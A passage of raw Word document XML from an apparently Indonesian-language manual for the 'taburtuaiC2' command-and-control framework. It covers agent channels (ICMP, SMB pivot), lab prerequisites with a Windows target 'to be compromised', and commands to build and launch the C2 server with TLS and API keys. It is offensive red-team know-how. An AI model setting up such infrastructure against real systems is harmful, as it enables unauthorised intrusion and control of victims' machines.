                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>ICMP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>—</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>TCP diblokir total (Windows only)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-icmp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>SMB Named Pipe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>445</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Internal pivot, tanpa internet</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>agent-win-smb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Prasyarat Lab</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Komponen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Spesifikasi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Keterangan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C2 Server OS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Linux / Windows / macOS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Go 1.21+ terinstall</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Target VM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Windows 10/11 / Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mesin yang akan di-compromise</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Go Toolchain</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>≥ 1.21</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Untuk build server &amp; agent</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MinGW (opsional)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>gcc untuk CGO</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Diperlukan beberapa build target</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Network</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Target bisa reach C2 IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Firewall rules disesuaikan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="100"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i/>
          <w:color w:val="555555"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ℹ  Untuk keperluan lab, C2 server dan target bisa berjalan di host yang sama atau VM yang se-network. Di lapangan, C2 server berada di VPS internet dengan domain dan TLS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="360" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>BAGIAN 2 — SETUP &amp; DEPLOYMENT SERVER</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="8" w:space="1" w:color="C0392B"/>
        </w:pBdr>
        <w:spacing w:before="0" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>C2 server menerima koneksi dari agent dan menyediakan API untuk operator. Server dapat dijalankan dalam berbagai mode: plain HTTP untuk testing, HTTPS untuk produksi, dengan atau tanpa listener tambahan (WebSocket, DNS).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Build Server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Step 1:  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Clone repository dan masuk ke direktori proyek.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>git clone https://github.com/mjopsec/taburtuaiC2.git</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cd taburtuaiC2</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Build semua binary sekaligus.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>make all</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Atau build server saja:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>make server</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Output: bin/server (Linux/Mac) atau bin/server.exe (Windows)</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Verifikasi binary berhasil di-build.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./bin/server --help</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Menjalankan Server — Mode Dasar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Untuk lab dan testing, server dapat dijalankan tanpa konfigurasi tambahan. Kunci enkripsi (ENCRYPTION_KEY) harus sama dengan yang di-bake ke dalam agent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Minimal — HTTP, port 8080, tidak ada autentikasi</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ENCRYPTION_KEY=K3yRah4sia ./bin/server</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Dengan log level debug untuk troubleshooting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ENCRYPTION_KEY=K3yRah4sia ./bin/server --log-level DEBUG</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Port custom</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ENCRYPTION_KEY=K3yRah4sia ./bin/server --port 8443</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Menjalankan Server — Mode Produksi (HTTPS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:i w:val="0"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Untuk deployment nyata, selalu gunakan TLS. Server dapat generate sertifikat self-signed secara otomatis, atau menggunakan sertifikat dari Let's Encrypt / CA lain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># HTTPS dengan sertifikat otomatis (self-signed)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ENCRYPTION_KEY=K3yRah4sia ./bin/server \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --tls \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --tls-port 8443 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --port 8080</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HTTPS dengan sertifikat kustom</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ENCRYPTION_KEY=K3yRah4sia ./bin/server \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --tls \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --tls-cert /etc/ssl/c2.crt \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --tls-key  /etc/ssl/c2.key \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --tls-port 443</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API key authentication (wajib di produksi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ENCRYPTION_KEY=K3yRah4sia ./bin/server \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --auth \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --api-key "s3cr3t-operator-key-2026" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --tls --tls-port 8443</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
